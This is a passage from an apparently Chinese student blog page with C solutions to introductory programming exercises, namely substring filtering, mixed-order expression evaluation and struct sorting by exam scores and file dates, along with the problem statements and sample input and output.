class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> x[<span class="number">100</span>], y[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n, m, i;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lower</span><span class="params">(<span class="keyword">char</span>* s)</span></span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, x);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, y[i]);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//小写</span></span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">lower(x);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">lower(y[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(y[i],x))</span><br><span class="line"><span class="built_in">puts</span>(y[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lower</span><span class="params">(<span class="keyword">char</span>* s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* p = s;</span><br><span class="line"><span class="keyword">for</span> (; *p != <span class="string">'\0'</span>; p++)</span><br><span class="line">*p = <span class="built_in">tolower</span>(*p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="表达式求值"><a href="#表达式求值" class="headerlink" title="表达式求值"></a>表达式求值</h3><p>问题描述<br>表达式由两个非负整数x，y和一个运算符op构成，求表达式的值。<br>这两个整数和运算符的顺序是随机的，可能是<code>”x op y”</code>， <code>“op x y”</code>或者 <code>“x y op”</code>，例如，<code>“25 + 3”</code>表示25加3，<code>“5 30 *”</code> 表示5乘以30，<code>“/ 600 15”</code>表示600除以15。</p><p>输入说明<br>输入为一个表达式，表达式由两个非负整数x，y和一个运算符op构成，x，y和op之间以空格分隔，但顺序不确定。<br>x和y均不大于10000000，op可以是<code>+，-,*，/，%</code>中的任意一种，分表表示加法，减法，乘法，除法和求余。<br>除法按整数除法求值，输入数据保证除法和求余运算的y值不为0。</p><p>输出说明<br>输出表达式的值。</p><p>输入样例<br>样例1输入<br><code>5 20 *</code><br>样例2输入<br><code>4 + 8</code><br>样例3输入<br><code>/ 8 4</code></p><p>输出样例<br>样例1输出<br><code>100</code><br>样例2输出<br><code>12</code><br>样例3输出<br><code>2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">20</span>], ch;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;,i,j,count,index;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> index, <span class="keyword">char</span> ch)</span></span>;</span><br><span class="line">gets_s(s, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>, count = <span class="number">0</span>; s[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isdigit</span>(s[i]))</span><br><span class="line">num[j] = num[j] * <span class="number">10</span> + s[i] - <span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isspace</span>(s[i]))</span><br><span class="line">&#123;</span><br><span class="line">j++;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ch = s[i];</span><br><span class="line">index = count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cal(num, index, ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> index,<span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line"><span class="keyword">if</span> (index == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">x = <span class="number">1</span>;</span><br><span class="line">y = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (index == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">x = <span class="number">0</span>;</span><br><span class="line">y = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">x = <span class="number">0</span>;</span><br><span class="line">y = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (ch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'+'</span>:<span class="built_in">printf</span>(<span class="string">"%d"</span>, num[x] + num[y]); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'-'</span>:<span class="built_in">printf</span>(<span class="string">"%d"</span>, num[x] - num[y]); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'*'</span>:<span class="built_in">printf</span>(<span class="string">"%d"</span>, num[x] * num[y]); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'/'</span>:<span class="built_in">printf</span>(<span class="string">"%d"</span>, num[x] / num[y]); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'%'</span>:<span class="built_in">printf</span>(<span class="string">"%d"</span>, num[x] % num[y]); <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p><del>结构体这里的方法都有点U•ェ•<em>U,主要是冒泡实在是太好用了pia!&gt;&lt;,尤其是以一个因素排一个东西时,不影响另一个因素的排序,然后我就U•ェ•</em>U到n个冒泡排完,当然选择也可以,但是冒泡我用熟了:-).</del></p><p>==大家最好还是不要这样,像什么一个main函数出现4个冒泡,简直就是老师看了想打人系列==</p><h3 id="复试筛选"><a href="#复试筛选" class="headerlink" title="复试筛选"></a>复试筛选</h3><p>问题描述<br>考研初试成绩公布后需要对m个学生的成绩进行排序，筛选出可以进入复试的前n名学生。<br>排序规则为首先按照总分排序，总分相同则按英语单科成绩排序，总分和英语成绩也相同时考号小者排在前面。<br>现给出这m个学生的考研初试成绩，请筛选出可以进入复试的n名学生并按照排名从高到低的顺序依次输出。</p><p>输入说明<br>输入为m+1行，第一行为两个整数m和n，分别表示总人数和可以进入复试人数，m和n之间用空格分隔，<code>0&lt;n&lt;m&lt;200</code>。<br>接下来为m行数据，每行包括三项信息，分别表示一个学生的考号（长度不超过20的字符串）、总成绩（小于500的整数）和英语单科成绩（小于100的整数），这三项之间用空格分隔。</p><p>输出说明<br>按排名从高到低的顺序输出进入复试的这n名学生的信息。</p><p>输入样例    </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> <span class="number">3</span></span><br><span class="line">XD20160001 <span class="number">330</span> <span class="number">65</span></span><br><span class="line">XD20160002 <span class="number">330</span> <span class="number">70</span></span><br><span class="line">XD20160003 <span class="number">340</span> <span class="number">60</span></span><br><span class="line">XD20160004 <span class="number">310</span> <span class="number">80</span></span><br><span class="line">XD20160005 <span class="number">360</span> <span class="number">75</span></span><br></pre></td></tr></table></figure><p>输出样例    </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XD20160005 <span class="number">360</span> <span class="number">75</span></span><br><span class="line">XD20160003 <span class="number">340</span> <span class="number">60</span></span><br><span class="line">XD20160002 <span class="number">330</span> <span class="number">70</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m, n,i,j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> s[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line"><span class="keyword">int</span> en;</span><br><span class="line">&#125;stu[<span class="number">200</span>],temp;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;m, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d %d"</span>, stu[i].s, &amp;stu[i].sum, &amp;stu[i].en);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m - <span class="number">1</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (stu[j].en &lt; stu[j + <span class="number">1</span>].en)</span><br><span class="line">&#123;</span><br><span class="line">temp = stu[j];</span><br><span class="line">stu[j] = stu[j + <span class="number">1</span>];</span><br><span class="line">stu[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m - <span class="number">1</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (stu[j].sum &lt; stu[j + <span class="number">1</span>].sum)</span><br><span class="line">&#123;</span><br><span class="line">temp = stu[j];</span><br><span class="line">stu[j] = stu[j + <span class="number">1</span>];</span><br><span class="line">stu[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %d %d\n"</span>, stu[i].s, stu[i].sum, stu[i].en);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件排序"><a href="#文件排序" class="headerlink" title="文件排序"></a>文件排序</h3><p>排序规则： </p><ol><li>日期优先，最后修改的排在前面</li><li>当修改日期相同时，大的文件排在前面。</li></ol><p>输入说明<br>第一行为一个数字 n，n 表示共有 n 个待排序的文件， 1≤ n≤ 100。<br>接下来是 n 行，每行包含一个文件的修改日期和文件大小，这两个字段之间用空格分隔。<br>文件修改日期包含年、月、日，表示年、月、日的整数之间用“/”分隔，格式为“年/月/ 日”。<br>年份的数值在 1960-2018 之间；月份的数值在 1-12 之间；日的数值在 1-31 之间。<br>文件大小是一个不超过 100000000 的整数。<br>输入数据中没有完全相同的日期和文件大小。 </p><p>输出说明<br>将输入数据按题目描述的规则排序后输出，每行输出一个文件的修改日期和文件大小。 </p><p>输入样例 </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">2018</span>/<span class="number">1</span>/<span class="number">8</span> <span class="number">1024</span> </span><br><span class="line"><span class="number">2012</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">256</span> </span><br><span class="line"><span class="number">2014</span>/<span class="number">10</span>/<span class="number">29</span> <span class="number">300</span> </span><br><span class="line"><span class="number">2012</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">457</span> </span><br><span class="line"><span class="number">2014</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">512</span> </span><br><span class="line"><span class="number">2011</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">95</span> </span><br><span class="line"><span class="number">2014</span>/<span class="number">11</span>/<span class="number">3</span> <span class="number">1102</span> </span><br><span class="line"><span class="number">2017</span>/<span class="number">11</span>/<span class="number">24</span> <span class="number">1535</span></span><br></pre></td></tr></table></figure><p>输出样例 </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2018</span>/<span class="number">1</span>/<span class="number">8</span> <span class="number">1024</span> </span><br><span class="line"><span class="number">2017</span>/<span class="number">11</span>/<span class="number">24</span> <span class="number">1535</span> </span><br><span class="line"><span class="number">2014</span>/<span class="number">11</span>/<span class="number">3</span> <span class="number">1102</span> </span><br><span class="line"><span class="number">2014</span>/<span class="number">10</span>/<span class="number">29</span> <span class="number">300</span> </span><br><span class="line"><span class="number">2014</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">512</span> </span><br><span class="line"><span class="number">2012</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">457</span> </span><br><span class="line"><span class="number">2012</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">256</span> </span><br><span class="line"><span class="number">2011</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">95</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, i, j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line"><span class="keyword">int</span> mon;</span><br><span class="line"><span class="keyword">int</span> day;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">bit</span>;</span><br><span class="line">&#125;file[<span class="number">100</span>],temp;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d/%d/%d %d"</span>, &amp;file[i].year, &amp;file[i].mon, &amp;file[i].day, &amp;file[i].<span class="built_in">bit</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[j].<span class="built_in">bit</span> &lt; file[j + <span class="number">1</span>].<span class="built_in">bit</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp = file[j];</span><br><span class="line">file[j] = file[j + <span class="number">1</span>];</span><br><span class="line">file[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[j].day &lt; file[j + <span class="number">1</span>].day)</span><br><span class="line">&#123;</span><br><span class="line">temp = file[j];</span><br><span class="line">file[j] = file[j + <span class="number">1</span>];</span><br><span class="line">file[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[j].mon &lt; file[j + <span class="number">1</span>].mon)</span><br><span class="line">&#123;</span><br><span class="line">temp = file[j];</span><br><span class="line">file[j] = file[j + <span class="number">1</span>];</span><br><span class="line">file[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file[j].year &lt; file[j + <span class="number">1</span>].year)</span><br><span class="line">&#123;</span><br><span class="line">temp = file[j];</span><br><span class="line">file[j] = file[j + <span class="number">1</span>];</span><br><span class="line">file[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d/%d/%d %d\n"</span>, file[i].year, file[i].mon, file[i].day, file[i].<span class="built_in">bit</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="考试排名"><a href="#考试排名" class="headerlink" title="考试排名"></a>考试排名</h3><p>问题描述</p><p>某考试有5道题和1道附加题，每题最高得分20分，总分计算为所有题目分数之和。给出一组考生的数据，对其按照总分从高到低进行排名，总分相同时按附加题得分高者优先。</p><p>输入说明</p><p>第一行为一个整数N，表示考生个数（N小于100），后面N行为考生数据，每行包含考生姓名（长度不超过20个字符）以及6个以空格分隔的整数，分别表示第一题到第五题以及附加题的得分（最后一项）。</p><p>输出说明</p><p>输出排序结果，每行为一个考生的姓名、总分、附加题得分，以空格分开。</p><p>输入样例</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> </span><br><span class="line">Jony <span class="number">18</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> </span><br><span class="line">Kavin <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">18</span> </span><br><span class="line">Kaku <span class="number">15</span> <span class="number">15</span> <span class="number">15</span> <span class="number">15</span> <span class="number">15</span> <span class="number">15</span></span><br></pre></td></tr></table></figure><p>输出样例</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Jony <span class="number">118</span> <span class="number">20</span> </span><br><span class="line">Kavin <span class="number">118</span> <span class="number">18</span> </span><br><span class="line">Kaku <span class="number">90</span> <span class="number">15</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,i,j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> t1;</span><br><span class="line"><span class="keyword">int</span> t2;</span><br><span class="line"><span class="keyword">int</span> t3;</span><br><span class="line"><span class="keyword">int</span> t4;</span><br><span class="line"><span class="keyword">int</span> t5;</span><br><span class="line"><span class="keyword">int</span> ex;</span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line">&#125;stu[<span class="number">100</span>],temp;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d %d %d %d %d %d"</span>, stu[i].name, &amp;stu[i].t1, &amp;stu[i].t2, &amp;stu[i].t3, &amp;stu[i].t4, &amp;stu[i].t5, &amp;stu[i].ex);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">stu[i].sum = stu[i].t1 + stu[i].t2 + stu[i].t3 + stu[i].t4 + stu[i].t5+stu[i].ex;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - <span class="number">1</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (stu[j].ex &lt; stu[j + <span class="number">1</span>].ex)</span><br><span class="line">&#123;</span><br><span class="line">temp = stu[j];</span><br><span class="line">stu[j] = stu[j + <span class="number">1</span>];</span><br><span class="line">stu[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - <span class="number">1</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (stu[j].sum &lt; stu[j + <span class="number">1</span>].sum)</span><br><span class="line">&#123;</span><br><span class="line">temp = stu[j];</span><br><span class="line">stu[j] = stu[j + <span class="number">1</span>];</span><br><span class="line">stu[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %d %d\n"</span>, stu[i].name, stu[i].sum, stu[i].ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="考勤系统"><a href="#考勤系统" class="headerlink" 